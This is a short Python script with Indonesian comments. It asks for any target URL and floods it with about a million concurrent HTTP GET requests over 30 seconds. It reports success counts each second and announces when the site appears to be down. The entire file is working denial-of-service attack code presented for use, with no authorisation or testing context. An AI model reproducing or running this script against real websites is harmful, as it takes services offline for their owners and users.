import aiohttp
import asyncio
import time

# Konfigurasi default
TOTAL_REQUESTS = 1_000_000
DURATION = 30
REQUESTS_PER_SECOND = TOTAL_REQUESTS // DURATION
CONCURRENT_CONNECTIONS = 1000

sem = asyncio.Semaphore(CONCURRENT_CONNECTIONS)

# Ambil input URL dari pengguna
URL = input("Masukkan URL target (termasuk https://): ")

total_sent = 0
total_success = 0

async def send_request(session):
    async with sem:
        try:
            async with session.get(URL, timeout=5) as response:
                await response.text()
                return response.status
        except Exception as e:
            return str(e)

async def send_batch(session, batch_size):
    tasks = [send_request(session) for _ in range(batch_size)]
    results = await asyncio.gather(*tasks)
    return results

async def run():
    global total_sent, total_success
    print(f"Mulai mengirimkan paket ke {URL} selama {DURATION} detik...")
    async with aiohttp.ClientSession() as session:
        for second in range(DURATION):
            start_time = time.time()
            results = await send_batch(session, REQUESTS_PER_SECOND)
            sent = len(results)
            success = sum(1 for r in results if isinstance(r, int) and r == 200)
            down_detected = all(not (isinstance(r, int) and r == 200) for r in results)

            total_sent += sent
            total_success += success

            print(f"Detik ke-{second+1}: {sent} request dikirim, {success} berhasil (HTTP 200)")

            if down_detected:
                print("\033[92m[NOTIFIKASI] Website kemungkinan DOWN - tidak ada respons HTTP 200\033[0m")

            if (second + 1) % 30 == 0:
                print(f"[NOTIFIKASI] Total {total_sent} request telah dikirim sejauh ini.")

            elapsed = time.time() - start_time
            if elapsed < 1:
                await asyncio.sleep(1 - elapsed)

if __name__ == "__main__":
    asyncio.run(run())